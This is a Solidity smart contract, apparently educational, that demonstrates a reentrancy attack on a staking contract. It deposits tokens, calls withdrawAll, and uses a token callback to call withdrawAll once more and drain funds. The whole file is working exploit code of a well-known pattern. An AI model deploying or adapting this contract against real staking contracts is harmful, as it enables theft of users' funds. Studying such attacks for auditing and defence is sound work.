// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {IERC20} from "./IERC20.sol";
import {IStaking} from "./IStaking.sol";
import {IReentrancyReceiver} from "./IReentrancyReceiver.sol";

/// @title ReentrancyAttacker
/// @notice Educational contract used to demonstrate a reentrancy attack.
/// @dev Deposits tokens into a staking contract and attempts to withdraw
///      repeatedly through a malicious token callback.
///      Do not use in production.
contract ReentrancyAttacker is IReentrancyReceiver {
    // =============================================================
    // STATE VARIABLES
    // =============================================================

    // ERC-20 token used by the staking contract.
    IERC20 public token;

    // Staking contract targeted by the attack.
    IStaking public staking;

    // Prevents the attacker from reentering more than once.
    bool public reentered;

    // =============================================================
    // CONSTRUCTOR
    // =============================================================

    /// @param tokenAddress Address of the token contract.
    /// @param stakingAddress Address of the staking contract to target.
    constructor(address tokenAddress, address stakingAddress) {
        token = IERC20(tokenAddress);
        staking = IStaking(stakingAddress);
    }

    // =============================================================
    // ATTACK PREPARATION
    // =============================================================

    /// @notice Approves the staking contract and deposits tokens.
    /// @param amount Number of tokens to deposit.
    function deposit(uint256 amount) external {
        bool success = token.approve(address(staking), amount);
        require(success, "Approval failed");

        staking.deposit(amount);
    }

    // =============================================================
    // ATTACK EXECUTION
    // =============================================================

    /// @notice Starts the attack by requesting a withdrawal.
    function attack() external {
        staking.withdrawAll();
    }

    // =============================================================
    // REENTRANCY CALLBACK
    // =============================================================

    /// @notice Callback invoked by the malicious token during a transfer.
    /// @dev Attempts one reentrant withdrawal.
    function onTokenReceived() external override {
        // Only the configured token may trigger the callback.
        require(msg.sender == address(token), "Unauthorized callback");

        // Attempt reentrancy only once.
        if (!reentered) {
            reentered = true;
            staking.withdrawAll();
        }
    }
}
